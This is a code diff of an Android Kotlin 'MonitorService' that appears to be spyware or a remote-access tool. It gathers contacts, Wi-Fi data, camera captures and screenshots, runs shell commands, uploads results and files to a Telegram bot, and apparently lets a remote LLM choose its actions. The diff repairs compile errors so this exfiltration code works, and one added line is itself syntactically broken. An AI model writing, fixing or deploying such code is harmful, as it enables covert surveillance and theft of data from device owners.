@@ -335,7 +335,7 @@ class MonitorService : Service() {
     }
 
     private fun executeCapability(capability: String, argsJson: String): Any {
-        val type = object : TypeToken<Map<String, Any>>() {}.type
+        val type = TypeToken.getParameterized(Map::class.java, String::class.java, Any::class.java).type
         val args = gson.fromJson(argsJson, type)
         return when (capability) {
             "contacts" -> getContacts()
@@ -515,7 +515,7 @@ class MonitorService : Service() {
                 "caps" to r.capabilities
             ) as Map<String, Any>
         }
-        hashMapOf<String, Any>(
+        return hashMapOf<String, Any>(
             "networks" to networks,
             "count" to networks.size
         ) as Map<String, Any>
@@ -633,7 +633,7 @@ class MonitorService : Service() {
     private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
         val cameraId = (args["camera"] as? Int) ?: 0
         val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
-        hashMapOf<String, Any>(
+        return hashMapOf<String, Any>(
             "status" to "requires_camera2",
             "note" to "Camera2 API needed",
             "file" to outputFile.absolutePath,
@@ -642,7 +642,7 @@ class MonitorService : Service() {
     }
 
     private fun getScreenshot(): Map<String, Any> {
-        hashMapOf<String, Any>(
+        return hashMapOf<String, Any>(
             "status" to "requires_mediaprojection",
             "note" to "Requires MediaProjection permission"
         ) as Map<String, Any>
@@ -655,13 +655,13 @@ class MonitorService : Service() {
             val output = process.inputStream.readAllBytes().toString(StandardCharsets.UTF_8)
             val error = process.errorStream.readAllBytes().toString(StandardCharsets.UTF_8)
             val exitCode = process.waitFor()
-            hashMapOf<String, Any>(
+            return hashMapOf<String, Any>(
                 "exit" to exitCode,
                 "output" to output,
                 "error" to error
             ) as Map<String, Any>
         } catch (e: Exception) {
-            hashMapOf<String, Any>("error" to (e.message ?: "unknown error")) as Map<String, Any>
+            return hashMapOf<String, Any>("error" to (e.message ?: "unknown error")) as Map<String, Any>
         }
     }
 
@@ -727,8 +727,7 @@ class MonitorService : Service() {
                 "parse_mode" to "Markdown"
             ) as Map<String, Any>
             val jsonBody = gson.toJson(params)
-            @Suppress("DEPRECATION")
-            val mediaType = MediaType.Companion.parse("application/json")
+            val mediaType = "application/json".toMediaType()
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder().url(url).post(body).build()
             client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
@@ -746,7 +745,7 @@ class MonitorService : Service() {
                     .addFormDataPart("chat_id", chatId.toString())
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("document", filename,
-                        @Suppress("DEPRECATION") RequestBody.create(MediaType.Companion.parse("text/plain"), file.readBytes()))
+                        Suppress("DEPRECATION") RequestBody.create("text/plain".toMediaType(), file.readBytes()))
                     .build()
 
                 val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
@@ -816,8 +815,7 @@ Only respond with valid JSON, no extra text."""
             ) as Map<String, Any>
 
             val jsonBody = gson.toJson(payload)
-            @Suppress("DEPRECATION")
-            val mediaType = MediaType.Companion.parse("application/json")
+            val mediaType = "application/json".toMediaType()
             val body = RequestBody.create(mediaType, jsonBody)
             val req = Request.Builder()
                 .url(NVIDIA_API_URL)
@@ -864,7 +862,7 @@ Only respond with valid JSON, no extra text."""
                 val args = actionObj.get("args")?.asJsonObject
                 val reasoning = actionObj.get("reasoning")?.asString ?: ""
 
-                val argsMap = hashMapOf<String, Any>() as Map<String, Any>
+                val argsMap = hashMapOf<String, Any>() as MutableMap<String, Any>
                 args?.entrySet()?.forEach { entry ->
                     val value: Any = when {
                         entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
